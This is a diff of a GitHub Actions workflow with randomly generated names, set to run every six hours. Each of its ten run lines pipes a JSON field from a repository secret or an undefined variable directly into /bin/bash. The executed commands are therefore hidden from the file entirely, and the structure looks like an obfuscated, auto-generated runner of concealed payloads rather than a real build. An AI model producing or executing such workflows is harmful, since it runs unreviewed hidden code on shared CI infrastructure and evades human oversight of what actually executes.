@@ -1,8 +1,9 @@
 name: yetuna7816
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '21 1/6 * * *'
 
 jobs:
   build:
@@ -12,15 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: yetuna7816
         env:
-          zflg4: ${{ secrets.zflg4 }}
+          ltzfv35: ${{ secrets.ltzfv35 }}
         run: |
-          echo $zflg4 | jq -r .g12 | /bin/bash
-          echo $qbnu3872 | jq -r .addiy2 | /bin/bash
-          echo $lfkf7 | jq -r .aua6918 | /bin/bash
-          echo $qg3 | jq -r .l1 | /bin/bash
-          echo $tytkw54 | jq -r .dipna9 | /bin/bash
-          echo $uth847 | jq -r .sk505 | /bin/bash
-          echo $gpn0951 | jq -r .rek397 | /bin/bash
-          echo $oa1396 | jq -r .ay295 | /bin/bash
-          echo $befzt83837 | jq -r .hptjh1 | /bin/bash
+          echo $ltzfv35 | jq -r .evw7222 | /bin/bash
+          echo $hkf38 | jq -r .jucb76 | /bin/bash
+          echo $yqho5379 | jq -r .bvak5 | /bin/bash
+          echo $gajbi503 | jq -r .imqn6379 | /bin/bash
+          echo $zd4578 | jq -r .lpxox2343 | /bin/bash
+          echo $zjdnx7 | jq -r .thnf0 | /bin/bash
+          echo $x96 | jq -r .mpnvj522 | /bin/bash
+          echo $dlfa3413 | jq -r .ke3 | /bin/bash
+          echo $yf6163 | jq -r .vc2 | /bin/bash
+          echo $erdky3 | jq -r .a584 | /bin/bash
 
